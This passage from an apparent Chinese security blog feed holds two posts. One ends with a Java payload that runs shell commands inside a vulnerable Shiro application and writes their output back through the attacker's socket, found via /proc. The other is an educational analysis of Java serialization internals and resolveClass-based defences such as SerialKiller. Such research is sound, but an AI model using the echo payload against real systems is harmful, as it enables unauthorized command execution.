class="string">"-c"</span>, <span class="string">"a=`cat /proc/$PPID/net/tcp6|awk '&#123;if($10&gt;0)print&#125;'|grep -i %s|awk '&#123;print $10&#125;'`;b=`ls -l /proc/$PPID/fd|grep $a|awk '&#123;print $9&#125;'`;echo -n $b"</span>&#125;;</span><br><span class="line">java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">java.io.InputStreamReader isr  = <span class="keyword">new</span> java.io.InputStreamReader(in);</span><br><span class="line">java.io.BufferedReader br = <span class="keyword">new</span> java.io.BufferedReader(isr);</span><br><span class="line">StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">String line;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">    stringBuilder.append(line);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> num = Integer.valueOf(stringBuilder.toString()).intValue();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd = <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/sh"</span>,<span class="string">"-c"</span>,<span class="string">"ifconfig"</span>&#125;;</span><br><span class="line"></span><br><span class="line">in = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">isr  = <span class="keyword">new</span> java.io.InputStreamReader(in);</span><br><span class="line">br = <span class="keyword">new</span> java.io.BufferedReader(isr);</span><br><span class="line">stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">    stringBuilder.append(line);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String ret = stringBuilder.toString();</span><br><span class="line">java.lang.reflect.Constructor c=java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]&#123;Integer.TYPE&#125;);</span><br><span class="line">c.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">java.io.FileOutputStream os = <span class="keyword">new</span> java.io.FileOutputStream((java.io.FileDescriptor)c.newInstance(<span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> Integer(num)&#125;));</span><br><span class="line">os.write(ret.getBytes());</span><br><span class="line">os.close();</span><br></pre></td></tr></table></figure><p>我这种低配版指令ifconfig后效果实现效果如下，服务端会直接返回数据并断掉连接，所以没有了后面http响应包，requests库无法识别返回的内容报错。<br><img src="1582541605629-07be9057-523f-47f1-aa13-3f1bc0369811.png#align=left&display=inline&height=259&name=image.png&originHeight=518&originWidth=3122&size=599181&status=done&style=none&width=1561" alt="image.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>我这种方法因为需要保证请求源端口，所以没办法按照图中师傅实现的一样在burp中（burp代理后发起请求的端口不可控）。同样的道理如果脆弱的shiro应用在反代后面，因为反代的源端口不可预测所以没办法用这种低配版方案拿到回显。但实际情况不出网的shiro肯定是在内网里面的，所以从这角度想想还有点鸡肋，就当抛砖引玉了～</li><li>在上面引用的文章中提到了 “jvm所有的对象都存储在堆内存中，也许可以通过某种方法直接获取存储在堆内存中的socket对象实现回显”，我猜可以在burp里面利用的情况应该是通过某种黑魔法获取到了本次请求的socket对象了（或者是更底层的方法）所以才不要以客户端源口作为过滤条件。</li><li>写到这忽然想起，那个图片payload貌似没有打码，或许把payload用shiro常见的密钥撞一下撞可以看到标准版思路的片段？体力不够，溜了。</li></ol><p>研究这个问题时候也请教了相关的大哥接收到了一些提示，因为属于他人知识产权，文章并未提及。在此谢过指点我的大哥们。</p>]]></content>
    
    <summary type="html">
    
      其实这个思路距离实现标配版的效果就一步之遥了～
    
    </summary>
    
    
      <category term="web security" scheme="http://yoursite.com/categories/web-security/"/>
    
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Java原生序列化与反序列化代码简要分析</title>
    <link href="http://yoursite.com/2020/02/14/Java%E5%8E%9F%E7%94%9F%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/02/14/Java%E5%8E%9F%E7%94%9F%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/</id>
    <published>2020-02-14T03:44:34.000Z</published>
    <updated>2020-07-11T08:03:17.449Z</updated>
    
    <content type="html"><![CDATA[<!-- 写这篇文章目的主要在于进一步理解何为java原生反序列化，并且回答如下的几个问题。 --><!-- more --><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>写这篇文章目的主要在于进一步理解何为java原生反序列化，并且回答的几个问题。</p><ol><li>为什么就java反序列化使用而言是反序列化类的readObject开始？</li><li>为什么resolveClass方法可以防御反序列化？</li><li>为什么在反序列化数据后面插入脏数据会不会影响反序列化？</li></ol><p><strong>ps: 碍于水平有限只会在代码表层做宏观和中观的分析，并不会深入特别底层。</strong></p><h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><p>序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">int</span> money = <span class="number">100</span>;</span><br><span class="line">    String firstname = <span class="string">"cl0und"</span>;</span><br><span class="line">    String lastname = <span class="string">"lisan"</span>;</span><br><span class="line"></span><br><span class="line">    User()&#123;</span><br><span class="line">        System.out.println(<span class="string">"无参数构造方法"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Serial</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectOutputStream oops = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./serializable.txt"</span>));</span><br><span class="line">        oops.writeObject(<span class="keyword">new</span> User());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Unserial</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream oips = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./serializable.txt"</span>));</span><br><span class="line">        User user = (User) oips.readObject();</span><br><span class="line">        System.out.println(user.age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><h3 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h3><p>预处理的意义是拿到类的描述符类ObjectStreamClass，后续对类的内省和写入序列化数据都由他完成或调度。<br><img src="1579071914321-a1cb1263-2c7b-4c2a-ac9e-ab59b368be6f.png#align=left&display=inline&height=268&name=image.png&originHeight=536&originWidth=2218&size=130937&status=done&style=none&width=1109" alt="image.png"></p><p><img src="1579072160993-ddec24eb-7894-4fa4-b0a3-6cc1525d0312.png#align=left&display=inline&height=499&name=image.png&originHeight=998&originWidth=2416&size=312156&status=done&style=none&width=1208" alt="image.png"></p><p><img src="1579072322762-373ead16-c408-4a20-b9c8-0e5afeb526a2.png#align=left&display=inline&height=79&name=image.png&originHeight=118&originWidth=1114&size=24543&status=done&style=none&width=746" alt="image.png"></p><h3 id="序列化数据"><a href="#序列化数据" class="headerlink" title="序列化数据"></a>序列化数据</h3><p>可以看到一共有三步，首先是TC_OBJECT，其次是类的元信息，最后是类的具体数据。<br><img src="1579072894925-2b64c24f-c27e-4076-9680-ff51ad8934d7.png#align=left&display=inline&height=526&name=image.png&originHeight=1052&originWidth=2218&size=309500&status=done&style=none&width=1109" alt="image.png"></p><p>第一步就写个标志头，比较简单我们下面直接从第二步开始看。</p><h4 id="writeClassDesc"><a href="#writeClassDesc" class="headerlink" title="writeClassDesc"></a>writeClassDesc</h4><p>在序列化对象的数据之前，首先会有一个对象类型的分类判断，这里分成四种类型来处理即null类型（TC_NULL）、handle类型（TC_REFERENCE）、代理类型（TC_PROXYCLASSDESC）、普通类型（TC_CLASSDESC）。我们这里的User是普通的类所以走最后的writeNonProxyDesc。<br><img src="1579072952655-5aaa96e0-5fdf-488a-ac94-8528a696d735.png#align=left&display=inline&height=265&name=image.png&originHeight=530&originWidth=2170&size=158579&status=done&style=none&width=1085" alt="image.png"></p><p>writeNonProxyDesc会先调用writeClassDescriptor把自己的属性信息写入，然后<strong>递归调用writeClassDesc写入父类元信息</strong>。<br><img src="1579073424200-23b27228-c0e6-4226-87ea-39f9a62cd74a.png#align=left&display=inline&height=456&name=image.png&originHeight=912&originWidth=2570&size=266403&status=done&style=none&width=1285" alt="image.png"></p><p>细看一下writeClassDescriptor，这里面会调用writeNonProxy。<br><img src="1579073626530-720d0886-3e01-4436-93f9-f965c7280d8b.png#align=left&display=inline&height=121&name=image.png&originHeight=198&originWidth=1220&size=40079&status=done&style=none&width=746" alt="image.png"></p><p>最后调用writeNonProxy，在for循环里面写入属性信息。<br><img src="1579073604762-ebea518b-6e04-4df7-a251-edb41729238d.png#align=left&display=inline&height=612&name=image.png&originHeight=1224&originWidth=1920&size=311877&status=done&style=none&width=960" alt="image.png"></p><p>这一段的写入如果最后用dump出来，就是下面这个样子。<br><img src="1579073704276-07463dd6-ef7f-4174-b38b-b7d9f8e3c621.png#align=left&display=inline&height=678&name=image.png&originHeight=1224&originWidth=1346&size=143782&status=done&style=none&width=746" alt="image.png"></p><h4 id="writeSerialData"><a href="#writeSerialData" class="headerlink" title="writeSerialData"></a>writeSerialData</h4><p>把类属性信息写去之后，接下来就是写类属性对应的具体值了。<img src="1579074696395-fa1ba6b8-6c83-4273-9d87-20620d97374f.png#align=left&display=inline&height=691&name=image.png&originHeight=1382&originWidth=2290&size=431384&status=done&style=none&width=1145" alt="image.png"></p><p><img src="1579075103594-84570cfe-d6c5-477a-aa31-8be9626ab9cd.png#align=left&display=inline&height=734&name=image.png&originHeight=1468&originWidth=2392&size=472323&status=done&style=none&width=1196" alt="image.png"></p><p><em>ps:非原生数据类型指的是字符串、数组、枚举类型、对象。</em><br>_<br>一个完整的dump如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">STREAM_MAGIC - 0xac ed</span><br><span class="line">STREAM_VERSION - 0x00 05</span><br><span class="line">Contents</span><br><span class="line">  TC_OBJECT - 0x73</span><br><span class="line">    TC_CLASSDESC - 0x72</span><br><span class="line">      className</span><br><span class="line">        Length - 4 - 0x00 04</span><br><span class="line">        Value - User - 0x55736572</span><br><span class="line">      serialVersionUID - 0xbb 67 4f fb 9b a9 d6 bb</span><br><span class="line">      newHandle 0x00 7e 00 00</span><br><span class="line">      classDescFlags - 0x02 - SC_SERIALIZABLE</span><br><span class="line">      fieldCount - 4 - 0x00 04</span><br><span class="line">      Fields</span><br><span class="line">        0:</span><br><span class="line">          Int - I - 0x49</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 3 - 0x00 03</span><br><span class="line">            Value - age - 0x616765</span><br><span class="line">        1:</span><br><span class="line">          Int - I - 0x49</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 5 - 0x00 05</span><br><span class="line">            Value - money - 0x6d6f6e6579</span><br><span class="line">        2:</span><br><span class="line">          Object - L - 0x4c</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 9 - 0x00 09</span><br><span class="line">            Value - firstname - 0x66697273746e616d65</span><br><span class="line">          className1</span><br><span class="line">            TC_STRING - 0x74</span><br><span class="line">              newHandle 0x00 7e 00 01</span><br><span class="line">              Length - 18 - 0x00 12</span><br><span class="line">              Value - Ljava&#x2F;lang&#x2F;String; - 0x4c6a6176612f6c616e672f537472696e673b</span><br><span class="line">        3:</span><br><span class="line">          Object - L - 0x4c</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 8 - 0x00 08</span><br><span class="line">            Value - lastname - 0x6c6173746e616d65</span><br><span class="line">          className1</span><br><span class="line">            TC_REFERENCE - 0x71</span><br><span class="line">              Handle - 8257537 - 0x00 7e 00 01</span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_ENDBLOCKDATA - 0x78</span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_NULL - 0x70</span><br><span class="line">    newHandle 0x00 7e 00 02</span><br><span class="line">    classdata</span><br><span class="line">      User</span><br><span class="line">        values</span><br><span class="line">          age</span><br><span class="line">            (int)20 - 0x00 00 00 14</span><br><span class="line">          money</span><br><span class="line">            (int)100 - 0x00 00 00 64</span><br><span class="line">          firstname</span><br><span class="line">            (object)</span><br><span class="line">              TC_STRING - 0x74</span><br><span class="line">                newHandle 0x00 7e 00 03</span><br><span class="line">                Length - 6 - 0x00 06</span><br><span class="line">                Value - cl0und - 0x636c30756e64</span><br><span class="line">          lastname</span><br><span class="line">            (object)</span><br><span class="line">              TC_STRING - 0x74</span><br><span class="line">                newHandle 0x00 7e 00 04</span><br><span class="line">                Length - 5 - 0x00 05</span><br><span class="line">                Value - lisan - 0x6c6973616e</span><br></pre></td></tr></table></figure><p>可以看到在序列化的时候世界上是写入了各字段长度的，所以在后面反序列化读的时候是按照字段长度来进行读取的。<strong>这也解释了为什么在反序列化数据后面插入脏数据会不会影响反序列化</strong>。</p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="预处理-1"><a href="#预处理-1" class="headerlink" title="预处理"></a>预处理</h3><p>反序列化和序列化互为称操作，其主要的操作在readObject0里面<br><img src="1579081394980-e507b22c-1658-4b07-b841-ba11924dcecb.png#align=left&display=inline&height=217&name=image.png&originHeight=434&originWidth=1926&size=114185&status=done&style=none&width=963" alt="image.png"></p><p>case到object进行反序列化，整个object的反序化在readOrdinaryObject中<br><img src="1579081417550-f6a84856-864a-4e96-bbb9-f92cfffeffa2.png#align=left&display=inline&height=62&name=image.png&originHeight=100&originWidth=1202&size=18103&status=done&style=none&width=746" alt="image.png"></p><p>和序列化对称还是分两步，第一步是读取出类的元信息（readClassDesc），第二步是读取出对象属性具体的数据（readSerialData）。<br><img src="1579097989089-bb47e454-4a63-4f1f-adba-b23a19fddfdf.png#align=left&display=inline&height=657&name=image.png&originHeight=1314&originWidth=2282&size=361847&status=done&style=none&width=1141" alt="image.png"></p><h3 id="反序列化数据"><a href="#反序列化数据" class="headerlink" title="反序列化数据"></a>反序列化数据</h3><h4 id="readClassDesc"><a href="#readClassDesc" class="headerlink" title="readClassDesc"></a>readClassDesc</h4><p>在序列化那里提到过，对把类类型分成四个类型处理，这里的User是非代理普通类，就走readNonProxyDesc。<br><img src="1579098107741-afcde48d-8a7a-4d1f-83be-c826002ecee5.png#align=left&display=inline&height=525&name=image.png&originHeight=1050&originWidth=2250&size=280701&status=done&style=none&width=1125" alt="image.png"></p><p>readNonProxyDesc中主要的操作在readClassDescriptor、resolveClass、initNonProxy（<strong>注意这里initNonProxy的最后一个传参，这里递归调用了readClassDesc</strong>）。<br><img src="1579098941907-9785fe5c-79de-442c-9632-f8366c6f50bc.png#align=left&display=inline&height=762&name=image.png&originHeight=1524&originWidth=2322&size=485982&status=done&style=none&width=1161" alt="image.png"></p><p>readClassDescriptor读出了类的元数据并把每一个属性名抽象成了ObjectStreamField类<br><img src="1579098457484-d2b7c5d1-7498-4b1b-84fb-4697e163e69c.png#align=left&display=inline&height=744&name=image.png&originHeight=1488&originWidth=2144&size=459960&status=done&style=none&width=1072" alt="image.png"></p><p>resolveClass对类类型进行了构建，注意这里第二参数为false，意味着并不会执行类的初始化（static代码块不执行）<br>。</p><p><img src="1579098865240-c1eebc8c-097a-4c4b-a621-fa41f37583a1.png#align=left&display=inline&height=293&name=image.png&originHeight=586&originWidth=2098&size=135558&status=done&style=none&width=1049" alt="image.png"></p><p><strong>另外注意这里解释了为什么设置反序列化防御的点是在resolveClass，如果想对反序列化设置防御，就需要自己实现一个ObjectInputStream。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyObjInputStream</span> <span class="keyword">extends</span> <span class="title">ObjInputStream</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyObjInputStream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(in);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjInputStream desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        System.out.println(<span class="string">"defence"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.resolveClass(desc)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>initNonProxy又构建了类的元信息。<br><img src="1579099519793-d21fcdc2-bccf-411c-bef1-5e517f4e508f.png#align=left&display=inline&height=474&name=image.png&originHeight=948&originWidth=1518&size=180999&status=done&style=none&width=759" alt="image.png"></p><p>最后desc（ObjectStreamClass）传出给外层readOrdinaryObject。首先会进行对象的初始化，然后读出数据注入类中。<br><img src="1579099650702-8f1fa375-96f9-4d7e-86e2-f6e25abf5621.png#align=left&display=inline&height=355&name=image.png&originHeight=710&originWidth=1720&size=154285&status=done&style=none&width=860" alt="image.png"></p><h4 id="readSerialData"><a href="#readSerialData" class="headerlink" title="readSerialData"></a>readSerialData</h4><p>如果我们自定义了readObject方法，那么这里就会invoke，<strong>这里解释了为什么就java反序列化使用而言是反序列化类的readObject开始。</strong><br><img src="1579101128866-30f3281e-d43c-4033-aa18-e81302113c73.png#align=left&display=inline&height=435&name=image.png&originHeight=870&originWidth=2158&size=270819&status=done&style=none&width=1079" alt="image.png"></p><p>但是在User类中在我们并没有自定义反序列化方法随意还是走默认路线。<br><img src="1579099806423-394e2869-54a0-41a1-ab91-84de80fde8de.png#align=left&display=inline&height=548&name=image.png&originHeight=1096&originWidth=2446&size=295874&status=done&style=none&width=1223" alt="image.png"></p><p>defaultReadFields，中第一个循环把原生类型数据赋给obj，第二个循环把数组、枚举类型、对象类型赋给obj。<br><img src="1579099910627-5e87fc03-44b5-4eca-a2e2-3d75b83f0fd8.png#align=left&display=inline&height=632&name=image.png&originHeight=1264&originWidth=2000&size=336960&status=done&style=none&width=1000" alt="image.png"></p><p>补充一张整个反序列化的时序图。<br><img src="1579141111812-93300e7b-b9e9-4e5c-a4d7-640bb1a38793.png#align=left&display=inline&height=801&name=image.png&originHeight=1602&originWidth=2582&size=1407262&status=done&style=none&width=1291" alt="image.png"></p><h2 id="从SerialKiller来java反序列化防御"><a href="#从SerialKiller来java反序列化防御" class="headerlink" title="从SerialKiller来java反序列化防御"></a>从SerialKiller来java反序列化防御</h2><p><a href="https://github.com/ikkisoft/SerialKiller">https://github.com/ikkisoft/SerialKiller</a><br>原生使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(is);</span><br><span class="line">String msg = (String) ois.readObject();</span><br></pre></td></tr></table></figure><p>加上SerialKiller后的使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream ois = <span class="keyword">new</span> SerialKiller(is, <span class="string">"/etc/serialkiller.conf"</span>);</span><br><span class="line">String msg = (String) ois.readObject();</span><br></pre></td></tr></table></figure><p>可以看到它的原理就是上面提的自己实现流并且在resolveClass处加上白名单或者黑名单的过滤。<br><img src="1581650629068-43309a6e-425b-40e0-a375-61538f1648db.png#align=left&display=inline&height=786&name=image.png&originHeight=1572&originWidth=2024&size=259760&status=done&style=none&width=1012" alt="image.png"></p><h2 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h2><p>当父子接口同时实现了Serializable接口时</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserBase</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    UserBase()&#123;</span><br><span class="line">        System.out.println(<span class="string">"UserBase无参构造"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    UserBase(<span class="keyword">int</span> age)&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">"UserBase有参构造"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User2</span> <span class="keyword">extends</span> <span class="title">UserBase</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    User2()&#123;</span><br><span class="line">        System.out.println(<span class="string">"User2无参构造"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    User2(<span class="keyword">int</span> age)&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">"User2有参构造"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>控制台输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UserBase无参构造</span><br><span class="line">User2有参构造</span><br><span class="line">-----------------</span><br><span class="line">2333</span><br></pre></td></tr></table></figure><p>当只有子类实现Serializable接口父类没有实现时。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerialAndUnserial</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectOutputStream oops = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./serializable.txt"</span>));</span><br><span class="line">        oops.writeObject(<span class="keyword">new</span> User2(<span class="number">2333</span>));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"-----------------"</span>);</span><br><span class="line">        ObjectInputStream oips = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./serializable.txt"</span>));</span><br><span class="line">        User2 user = (User2) oips.readObject();</span><br><span class="line"></span><br><span class="line">        System.out.println(user.age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserBase</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    UserBase()&#123;</span><br><span class="line">        System.out.println(<span class="string">"UserBase无参构造"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    UserBase(<span class="keyword">int</span> age)&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">"UserBase有参构造"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User2</span> <span class="keyword">extends</span> <span class="title">UserBase</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    User2()&#123;</span><br><span class="line">        System.out.println(<span class="string">"User2无参构造"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    User2(<span class="keyword">int</span> age)&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">"User2有参构造"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">UserBase无参构造</span><br><span class="line">User2有参构造</span><br><span class="line">-----------------</span><br><span class="line">UserBase无参构造</span><br><span class="line">0</span><br></pre></td></tr></table></figure><h2 id="总结及一些tip"><a href="#总结及一些tip" class="headerlink" 